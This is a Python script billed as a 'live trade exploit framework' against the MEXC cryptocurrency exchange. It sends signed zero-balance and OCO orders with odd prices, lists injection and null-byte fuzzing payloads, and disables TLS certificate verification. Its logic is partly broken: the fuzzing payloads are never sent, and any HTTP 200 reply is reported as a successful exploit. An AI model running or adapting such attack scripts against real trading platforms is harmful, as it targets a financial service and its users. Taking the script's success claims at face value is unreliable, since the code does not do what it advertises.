#!/usr/bin/env python3
# MEXC Zero-Balance Live Trade Exploit Framework v9.1 (DEBUGGED)

import hmac
import hashlib
import requests
import socket
import ssl
import json
import os
from urllib.parse import urlencode
from time import time

class MEXCTradeExploit:
    def __init__(self, api_key, api_secret):
        self.api_key = api_key
        self.api_secret = api_secret
        self.base_url = "https://api.mexc.com"
        self._session = requests.Session()
        self._session.verify = False  # Disable SSL verification for testing
        self._session.headers.update({
            'X-MEXC-APIKEY': self.api_key,
            'Content-Type': 'application/json'
        })

    def _generate_signature(self, params):
        """Proper HMAC-SHA256 signature generation"""
        params['timestamp'] = int(time() * 1000)  # Current timestamp in ms
        query_string = urlencode(sorted(params.items()))
        return hmac.new(
            self.api_secret.encode('utf-8'),
            query_string.encode('utf-8'),
            hashlib.sha256
        ).hexdigest()

    def _execute_trade_attack(self, endpoint, params):
        """Execute trade exploit with proper signature"""
        try:
            params['signature'] = self._generate_signature(params)
            response = self._session.post(
                f"{self.base_url}{endpoint}",
                data=json.dumps(params),
                timeout=10
            )
            return {
                'status': response.status_code,
                'response': response.json(),
                'exploit_success': response.status_code == 200
            }
        except Exception as e:
            return {'error': str(e)}

    def _test_zero_balance_trade(self, symbol):
        """Test order placement without balance"""
        params = {
            'symbol': symbol,
            'side': 'BUY',
            'type': 'MARKET',
            'quantity': 0.001,
            'newOrderRespType': 'ACK',
            'test': True  # Critical test mode flag
        }
        return self._execute_trade_attack('/api/v3/order/test', params)

    def _test_oco_exploit(self, symbol):
        """Test OCO order exploit"""
        params = {
            'symbol': symbol,
            'side': 'BUY',
            'quantity': 0.001,
            'price': 83529,  # Impossible price
            'stopPrice': 100000,
            'stopLimitPrice': 100000,
            'stopLimitTimeInForce': 'GTC',
            'test': True
        }
        return self._execute_trade_attack('/api/v3/order/oco', params)

    def execute_attacks(self, symbol):
        """Full attack sequence with error handling"""
        results = {
            'test_order': self._test_zero_balance_trade(symbol),
            'oco_exploit': self._test_oco_exploit(symbol),
            'fuzzing_vectors': [
                {"quantity": "1'UNION SELECT 1--", "type": "MARKET"},
                {"symbol": "BTCUSDT\0", "side": "BUY"},
                {"timeInForce": "GTX", "price": "NaN"}
            ]
        }
        return results

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description='MEXC Live Trade Exploit v9.1')
    parser.add_argument('--api-key', required=True)
    parser.add_argument('--api-secret', required=True)
    parser.add_argument('--symbol', default='BTCUSDT')
    args = parser.parse_args()

    print("""
    ███╗   ███╗███████╗██╗  ██╗ ██████╗    ██████╗ █████╗ ██████╗ ███████╗
    ████╗ ████║██╔════╝╚██╗██╔╝██╔════╝    ██╔══██╗██╔══██╗██╔══██╗██╔════╝
    ██╔████╔██║█████╗   ╚███╔╝ ██║  ███╗   ██║  ██║███████║██████╔╝█████╗  
    ██║╚██╔╝██║██╔══╝   ██╔██╗ ██║   ██║   ██║  ██║██╔══██║██╔══██╗██╔══╝  
    ██║ ╚═╝ ██║███████╗██╔╝ ██╗╚██████╔╝   ██████╔╝██║  ██║██║  ██║███████╗
    ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
    DEBUGGED ZERO-BALANCE TRADE EXPLOIT FRAMEWORK v9.1
    """)

    attacker = MEXCTradeExploit(args.api_key, args.api_secret)
    results = attacker.execute_attacks(args.symbol)
    
    print("\n🔥 LIVE TRADE EXPLOIT RESULTS 🔥")
    print(json.dumps(results, indent=2))

    print("\n💀 EXPLOIT SUMMARY:")
    for test, result in results.items():
        if test != 'fuzzing_vectors':
            status = "✅ SUCCESS" if result.get('exploit_success') else "❌ FAILED"
            print(f"{status} - {test.upper()}")
